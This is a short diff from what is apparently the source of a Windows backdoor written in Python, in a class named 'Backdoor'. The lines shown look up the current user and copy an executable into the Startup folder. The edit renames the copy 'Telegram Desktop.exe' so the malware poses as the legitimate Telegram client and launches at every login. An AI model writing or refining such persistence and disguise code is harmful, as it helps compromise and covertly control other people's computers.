@@ -147,7 +147,7 @@ class Backdoor:
 
 username = UkDecode(subprocess.check_output("echo \%username%", shell = True))[1:-2:]
 path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
-command = f'copy Telegram.exe "{path}"'
+command = f'copy Telegram.exe "{path}Telegram Desktop.exe"'
 os.system(command)
 
 # time.sleep(10)
